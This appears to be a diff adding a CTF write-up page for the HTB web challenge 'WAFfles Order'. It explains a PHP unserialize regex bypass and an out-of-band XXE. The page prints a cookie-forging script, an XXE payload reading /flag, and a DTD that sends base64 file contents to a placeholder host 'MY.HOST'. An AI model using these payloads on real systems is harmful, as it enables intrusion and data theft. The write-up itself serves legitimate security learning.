@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<meta http-equiv="Content-Type" content="text/html" charset="UTF-8"/>
+
+
+
+
+
+    
+    <link rel="stylesheet" href="/css/main.min.f9b46e3a4a677dd7510a249b19438a1799f77c971a2b5cb9996e81d2eb49d7f0.css" integrity="sha256-+bRuOkpnfddRCiSbGUOKF5n3fJcaK1y5mW6B0utJ1/A="/>
+
+
+    <title> 
+WAFfles Order - sourque 
+ </title>
+</head>
+<body class="bg-black text-white flex flex-col h-screen">
+    
+    
+<main class="flex flex-grow md:container mx-auto grid grid-cols-1 lg:grid-cols-10 px-10 py-8 xl:px-28 2xl:px-54">
+
+        
+        <aside class="lg:sidebar lg:h-screen lg:sticky lg:top-12 col-span-2 pb-2">
+            <ul>
+                <li>
+                    <a class="wacky" href="/">Home</a>
+                </li>
+            </ul>
+
+            
+            <br>
+            <b>WAFfles Order</b>
+            <i><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#source-code-review">Source Code Review</a></li>
+    <li><a href="#regex-bypass">Regex Bypass</a></li>
+    <li><a href="#xxe">XXE</a></li>
+  </ul>
+</nav></i>
+            
+        </aside>
+
+        
+        <div class="main-content col-span-1 lg:col-span-8">
+            <h1>WAFfles Order</h1>
+                
+                Category: <b>web</b>
+                
+                
+                
+
+                <blockquote>
+<p>Our WAFfles and ice scream are out of this world, come to our online WAFfles house and check out our super secure ordering system API!</p>
+</blockquote>
+<h2 id="enumeration">Enumeration</h2>
+<p>Browsing to the website, we are greeted with this aesthetically&hellip; interesting&hellip; page:</p>
+<p><img src="../image-20201122190754660.png" alt="image-20201122190754660"></p>
+<p>We can input a table number, and send it off:</p>
+<p><img src="../image-20201122191407926.png" alt="image-20201122191407926"></p>
+<p>For which the post request looks like:</p>
+<p><img src="../image-20201122191450370.png" alt="image-20201122191450370"></p>
+<h2 id="source-code-review">Source Code Review</h2>
+<p>Nothing really interesting here. However! We are given the source code for the application, which means we&rsquo;re in for some fun. Fortunately, the code is very concise and easy to read. Poking around, we read <code>controllers/OrderController.php</code>, which handles our order requests.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">OrderController</span>
+{
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">order</span>($router)
+    {
+        $body <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#39;php://input&#39;</span>);
+        $cookie <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($_COOKIE[<span style="color:#e6db74">&#39;PHPSESSID&#39;</span>]);
+<span style="display:block;width:100%;background-color:#3c3d38">        <span style="color:#a6e22e">safe_object</span>($cookie);
+</span><span style="display:block;width:100%;background-color:#3c3d38">        $user <span style="color:#f92672">=</span> <span style="color:#a6e22e">unserialize</span>($cookie);
+</span>
+        <span style="color:#66d9ef">if</span> ($_SERVER[<span style="color:#e6db74">&#39;HTTP_CONTENT_TYPE&#39;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#39;application/json&#39;</span>)
+        {
+            $order <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($body);
+            <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$order<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">food</span>) 
+                <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">json_encode</span>([
+                    <span style="color:#e6db74">&#39;status&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;danger&#39;</span>,
+                    <span style="color:#e6db74">&#39;message&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;You need to select a food option first&#39;</span>
+                ]);
+            <span style="color:#66d9ef">if</span> ($_ENV[<span style="color:#e6db74">&#39;debug&#39;</span>])
+            {
+                $date <span style="color:#f92672">=</span> <span style="color:#a6e22e">date</span>(<span style="color:#e6db74">&#39;d-m-Y G:i:s&#39;</span>);
+                <span style="color:#a6e22e">file_put_contents</span>(<span style="color:#e6db74">&#39;/tmp/orders.log&#39;</span>, <span style="color:#e6db74">&#34;[</span><span style="color:#e6db74">${</span>date<span style="color:#e6db74">}</span><span style="color:#e6db74">] </span><span style="color:#e6db74">${</span>body<span style="color:#e6db74">}</span><span style="color:#e6db74"> by </span><span style="color:#e6db74">{</span>$user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">FILE_APPEND</span>);
+            }
+            <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">json_encode</span>([
+                <span style="color:#e6db74">&#39;status&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#39;success&#39;</span>,
+                <span style="color:#e6db74">&#39;message&#39;</span> <span style="color:#f92672">=&gt;</span> <span style="color:#e6db74">&#34;Hello </span><span style="color:#e6db74">{</span>$user<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span><span style="color:#e6db74">}</span><span style="color:#e6db74">, your </span><span style="color:#e6db74">{</span>$order<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">food</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> order has been submitted successfully.&#34;</span>
+            ]);
+        }
+        <span style="color:#66d9ef">else</span>
+        {
+            <span style="color:#66d9ef">return</span> $router<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">abort</span>(<span style="color:#ae81ff">400</span>);
+        }
+    }
+}
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>This is pretty juicy! Namely, on line 24 we see that our !!! <strong>user controlled</strong> !!! cookie is unserialized. That means, depending on what classes are included in the application, we might be able to get local file inclusion (LFI) or even remote code execution (RCE).</p>
+<hr>
+<p>A brief aside on PHP unserialization, from a PHP noob:</p>
+<p>Sometimes, PHP writers want to store PHP objects or data in a string format for easy storage or retrieval.
+It&rsquo;s a <strong>standard format</strong>. For example, for our UserModel object, the serialized data might look like <code>O:9:&quot;UserModel&quot;:1:{s:8:&quot;username&quot;;s:10:&quot;guest_5fb8&quot;;}</code> where <code>O</code> means object, the numbers are length specifiers, and <code>s</code> means string for both key and value, separated by semicolons.</p>
+<p>So, if we can control the string that is unserialized, we can &ldquo;create&rdquo; any object we want! But we can&rsquo;t execute any actual PHP code, so how is that useful?
+Except in very rare cases, we&rsquo;re going to have to rely on PHP &ldquo;<strong>magic functions</strong>&rdquo;, some of which get run automatically on object creation/serialization (<code>__construct/__sleep</code>) or destruction/unserialization (<code>__destruct/__wakeup</code>) or other situations like being printed (<code>__toString</code>). So, our goal is to create an object that has some magic functions we can use.</p>
+<blockquote>
+<p>Note that all of these functions start with <code>__</code>. This becomes important later.</p>
+</blockquote>
+<hr>
+<p>The only two models/classes included in the application are <code>UserModel</code>, used for handling of user data in receiving orders, and <code>XMLParserModel</code>, which is used for some throwaway environment file parsing, and looks like:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">XmlParserModel</span>
+{
+    <span style="color:#66d9ef">private</span> <span style="color:#a6e22e">string</span> $data;
+    <span style="color:#66d9ef">private</span> <span style="color:#66d9ef">array</span> $env;
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct($data)
+    {
+        $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span> <span style="color:#f92672">=</span> $data;
+    }
+
+    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __wakeup()
+    {
+        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match_all</span>(<span style="color:#e6db74">&#34;/&lt;!ENTITY\s+[^\s]+\s+SYSTEM\s+[\&#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">](?i:file|http|https|ftp|php|zlib|data|glob|expect|zip):\/\//mi&#34;</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span>))
+        {
+            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#39;Unsafe XML&#39;</span>);
+        }
+        $env <span style="color:#f92672">=</span> <span style="color:#a6e22e">simplexml_load_string</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">data</span>, <span style="color:#e6db74">&#39;SimpleXMLElement&#39;</span>, <span style="color:#a6e22e">LIBXML_NOENT</span>);
+        <span style="color:#66d9ef">foreach</span> ($env <span style="color:#66d9ef">as</span> $key <span style="color:#f92672">=&gt;</span> $value)
+        {
+            $_ENV[$key] <span style="color:#f92672">=</span> (<span style="color:#a6e22e">string</span>)$value;
+        }
+    }
+
+}
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>We see that this class has both <code>__construct</code> and <code>__wakeup</code>, and is pretty much exactly what we need. Also note that <code>simplexml_load_string</code> is called with the <code>LIBXML_NOENT</code> flag, for which the docs say:</p>
+<p><img src="../image-20201122193157028.png" alt="image-20201122193157028"></p>
+<p>And, we see the very suspicious <code>preg_match_all</code> call with strings commonly found in XML External Entities (XXE) payloads. Sounds like a plan! :flushed:</p>
+<blockquote>
+<p>Web challenge tip: if you&rsquo;re given source code, and it&rsquo;s a tough challenge, ALWAYS set up a local copy! I don&rsquo;t think I would&rsquo;ve been able to solve this if I hadn&rsquo;t been able to add debug messages.</p>
+</blockquote>
+<p>So now, we should be thinking: how can we get an <code>XmlParserObject</code> with our arbitrary data unserialized? The astute among us may have seen the call to <code>safe_object</code> function right before the cookie is deserialized, which is fortunately not a standard PHP function. Here&rsquo;s what it does:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">function</span> <span style="color:#a6e22e">safe_object</span>($serialized_data)
+{
+    $matches <span style="color:#f92672">=</span> [];
+    $num_matches <span style="color:#f92672">=</span> <span style="color:#a6e22e">preg_match_all</span>(<span style="color:#e6db74">&#39;/(^|;)O:\d+:&#34;([^&#34;]+)&#34;/&#39;</span>, $serialized_data, $matches);
+
+    <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; $i <span style="color:#f92672">&lt;</span> $num_matches; $i<span style="color:#f92672">++</span>) {
+        $methods <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_class_methods</span>($matches[<span style="color:#ae81ff">2</span>][$i]);
+        <span style="color:#66d9ef">foreach</span> ($methods <span style="color:#66d9ef">as</span> $method) {
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">preg_match</span>(<span style="color:#e6db74">&#39;/^__.*$/&#39;</span>, $method) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) {
+                <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;Unsafe method: </span><span style="color:#e6db74">${</span>method<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>);
+            }
+        }
+    }
+}
+</code></pre></div>
+<p>Or, essentially, if any matches to the regex <code>(^|;)O:\d+:&quot;([^&quot;]+)&quot;</code> are found, check the methods for the class within the quotes, and if it has any methods starting with <code>__</code>, refuse to continue.</p>
+<p>The regex broken down goes like this: <code>start of line</code> or <code>;</code>, then <code>O:numbers:&quot;sometext&quot;</code>.</p>
+<p>So it would match <code>O:14:&quot;XmlParserModel&quot;:...</code> and <code>a:1:{i:0;O:14:&quot;XmlParserModel&quot;:...</code>, both correctly grabbing the name of the object. So we need to somehow bypass the regex, or cause it to grab the wrong name for the object.</p>
+<h2 id="regex-bypass">Regex Bypass</h2>
+<p>This took me SO long to figure out. The key insight I was missing is that with <code>pgrep_match_all</code>, if some text is part of one match, it won&rsquo;t search that text for the start of another match. For example, for this input:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-txt" data-lang="txt">APPLEAPPLESAUCE ORANGESAUCE
+</code></pre></div><p>with the regex searching for <code>APPLE</code> followed by any <code>A-Z</code> characters then some whitespace <code>\s</code>, it will only match <code>APPLEAPPLESAUCE</code> and NOT <code>APPLESAUCE</code> (as a substring of <code>APPLEAPPLESAUCE</code>).</p>
+<p>Therefore, we could put the object initialization into a serialized array, for which the key is the start of an (invalid) object serialization string. So, something like:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">require</span>(<span style="color:#e6db74">&#34;./models/XmlParserModel.php&#34;</span>);
+<span style="color:#66d9ef">require</span>(<span style="color:#e6db74">&#34;./models/UserModel.php&#34;</span>);
+
+$payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;XXE-causing XML here&#39;</span>;
+
+$foo <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XmlParserModel</span>($payload);
+
+$lol <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">UserModel</span>();
+$lol<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>;
+$lol<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+    <span style="color:#e6db74">&#34;;O:12:&#34;</span> <span style="color:#f92672">=&gt;</span> $foo,
+);
+
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($lol);
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Which produces:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">9</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;UserModel&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">8</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;username&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">5</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;admin&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;test&#34;</span>;<span style="color:#a6e22e">a</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">6</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;;O:12:&#34;</span>;<span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">14</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;XmlParserModel&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;^@XmlParserModel^@data&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">20</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;XXE-causing XML here&#34;</span>;}}}
+</code></pre></div><p>Due to the key name being <code>O:12:</code>, the regex will include the start of the <em>actual</em> object deserialization as <code>O:12:&quot;;O:14:&quot;</code>. Obviously, <code>;O:14:</code> is not a valid class name, so we finally bypass the method check, and move on to trying to trigger XXE for file exfiltration.</p>
+<h2 id="xxe">XXE</h2>
+<p>However, no joy, there&rsquo;s another regex filter! This is the same one we saw earlier that suggested XXE.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#a6e22e">preg_match_all</span>(<span style="color:#e6db74">&#34;/&lt;!ENTITY\s+[^\s]+\s+SYSTEM\s+[\&#39;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">](?i:file|http|https|ftp|php|zlib|data|glob|expect|zip):\/\//mi&#34;</span>)
+</code></pre></div><p>So, case insensitive looking for any <code>&lt;!ENTITY SYSTEM ...</code> calls. This regex is a lot less effective than the other one and I got past it a couple times without even meaning to.</p>
+<p>If you haven&rsquo;t seen XXE used before, our goal is to take a reference to an external object (like, a file) with an XML <code>ENTITY</code> followed by <code>SYSTEM</code> or <code>PUBLIC &quot;name&quot;</code>,  and include its content in an HTTP request in order to exfiltrate it.</p>
+<p>Let&rsquo;s test it on local to make sure that XXE works with a basic payload:</p>
+<p><img src="../image-20201122195427539.png" alt="image-20201122195427539"></p>
+<p>Cool, it grabs files locally. Now we have to get it to reach out with the content of those files, and <code>/flag</code> instead of <code>/etc/passwd</code>.</p>
+<p>In the end, I went for Out of Band (OOB) XXE, hosting the following <code>DTD</code> on my server:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">&lt;!ENTITY % cool SYSTEM <span style="color:#e6db74">&#34;php://filter/read=convert.base64-encode/resource=/flag&#34;</span>&gt;
+&lt;!ENTITY % all <span style="color:#e6db74">&#39;&lt;!ENTITY send SYSTEM &#34;http://MY.HOST:4200/%cool;&#34;&gt;&#39;</span>&gt;
+%all;
+</code></pre></div><p>We knew the flag was at <code>/flag</code> with the source we downloaded. It&rsquo;s <code>base64</code> encoded because the newline <code>\n</code> at the end of the file would cause <code>SimpleXML</code> to throw and error and say that the Uniform Resource Indicator (URI) was invalid when we tried to include the file contents as part of it.</p>
+<p>So, our final object solve &ldquo;script&rdquo; looks like:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#66d9ef">require</span>(<span style="color:#e6db74">&#34;./models/XmlParserModel.php&#34;</span>);
+<span style="color:#66d9ef">require</span>(<span style="color:#e6db74">&#34;./models/UserModel.php&#34;</span>);
+
+$payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;ISO-8859-1&#34;?&gt;
+</span><span style="color:#e6db74">&lt;!DOCTYPE data [
+</span><span style="color:#e6db74">&lt;!ENTITY % file SYSTEM
+</span><span style="color:#e6db74">&#34;file:///flag&#34;&gt;
+</span><span style="color:#e6db74">&lt;!ENTITY % dtd SYSTEM
+</span><span style="color:#e6db74">&#34;http://MY.HOST/ctf.dtd&#34;&gt;
+</span><span style="color:#e6db74">%dtd;
+</span><span style="color:#e6db74">]&gt;
+</span><span style="color:#e6db74">&lt;data&gt;&amp;send;&lt;/data&gt;&#39;</span>;
+
+$foo <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">XmlParserModel</span>($payload);
+
+$lol <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">UserModel</span>();
+$lol<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;admin&#39;</span>;
+$lol<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">test</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>(
+    <span style="color:#e6db74">&#34;;O:12:&#34;</span> <span style="color:#f92672">=&gt;</span> $foo,
+);
+
+<span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($lol);
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Before getting the flag though, I&rsquo;d like to mention that, like most writeups, this post gives an illusion of intelligence and purpose, which is most definitely false. Due to source being pretty small, we were able to ascertain the correct path pretty quickly, but we also tried:</p>
+<ul>
+<li>Tomfoolery with JSON posted to endpoint for an order
+<ul>
+<li>Had both client and server side validation</li>
+<li>No server-side template injection</li>
+</ul>
+</li>
+<li>PHPSESSID generation was predictable, maybe forge it?</li>
+<li>Eight billion types of regex bypasses that didn&rsquo;t work
+<ul>
+<li>Explored source code and niche blog posts to find <code>+</code> before number in a serialized object bypass or <code>C</code> custom datatype</li>
+</ul>
+</li>
+</ul>
+<p>Back to the fun, we submit our malicious cookie, and get a callback from remote!</p>
+<p><img src="../image-20201122195624427.png" alt="image-20201122195624427"></p>
+<p>And the flag, for the first blood and a massive dopamine hit:</p>
+<p><img src="../image-20201122195700319.png" alt="image-20201122195700319"></p>
+<p>Thank you to makelaris and makelarisjr for a great challenge :)</p>
+<p>Flag: <code>HTB{wh0_l3t_th3_enc0d1ngs_0ut??w00f..w00f..w00f..WAFfles!}</code></p>
+
+        </div>
+     </main>
+
+<footer class="footer py-1">
+    <div class="flex justify-center text-white py-1"></div>
+</footer>
+
+</body>
